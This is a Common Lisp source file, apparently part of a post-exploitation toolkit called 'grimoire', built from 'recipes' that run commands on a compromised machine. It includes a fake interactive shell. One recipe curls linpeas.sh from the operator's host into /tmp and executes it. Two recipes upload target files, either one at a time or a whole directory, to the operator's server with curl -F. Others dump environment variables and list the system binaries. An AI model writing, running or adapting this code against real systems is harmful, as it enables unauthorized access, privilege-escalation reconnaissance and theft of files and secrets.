(in-package :grimoire)

(defparameter *current-dir* nil)

(defun exec-keep-pwd (command)
  (if (str:starts-with? "cd " command)
      (setf *current-dir* 
            (use :exec (fmt "cd ~a && cd ~a && pwd"
                            *current-dir*
                            (str:replace-first "cd " "" command))))
      (use :exec (fmt "cd ~a && ~a" *current-dir* command))))

(defun fake-shell-prompt ()
  (out "~%[~a]$ " *current-dir*)
  (force-output)
  (read-line))

(define-recipe fake-shell (:exec) ()
  "gives a 'fake' shell that allows for command execution and follows cd commands"
  (setf *current-dir* (use :exec "pwd"))

  ;; shell
  (loop for command = (fake-shell-prompt)
        if (string= command "exit") do (return)
        else do (out "~a~%" (exec-keep-pwd command))))

(defun mi-funcion (nombre)
  (out "Mi nombre es '~a'~%" nombre))

(define-recipe linpeas (:exec) ()
  (out "[+] Downloading linpeas~%")
  (use :exec (fmt "curl http://~a:5000/tools/linpeas.sh > /tmp/linpeas.sh"
                  *host-ip*))
  
  (out "[+] Running linpeas.sh~%")
  (use :exec "sh /tmp/linpeas.sh > /tmp/output.txt")
  
  (out "[+] Results:~%")
  (use :exec "cat /tmp/output.txt"))

(define-recipe list-files (:exec) (path &key absolute-path)
  "returns a list of all files in the path"
  (let ((files (str:split #\Newline (use :exec (fmt "ls ~a" path))))
        (ends-with-slash (str:ends-with? "/" path)))
    (if absolute-path
        (mapcar #'(lambda (f) 
                    (if ends-with-slash
                        (str:concat path f)
                        (str:concat path "/" f)))
                files)
        files)))

(define-recipe download (:exec) (path)
  "downloads the file to your project's folder"
  (use :exec (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
                  path *host-ip*)))

(define-recipe download-all (:exec) (path)
  "downloads all files in the path to your project's folder"
  (let ((files (list-files path :absolute-path t)))
    (dolist (file files)
      (use :exec (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
                      file *host-ip*)))))

(define-recipe environment (:exec) (&optional key)
  "returns all environment variables"
  (let ((res (parse-key=value (use :exec "set"))))
    (if key 
        (cdr (find-if #'(lambda (k) (string= k key)) res :key #'car))
        res)))

(define-recipe path (:exec) ()
  (str:split ":" (environment "PATH")))

(define-recipe system-binaries (:exec) (&key absolute-path)
  "list the binaries in the default places"
  (remove-duplicates 
   (mapcan #'(lambda (p) 
               (list-files p :absolute-path absolute-path))
           (path))
   :test #'string=))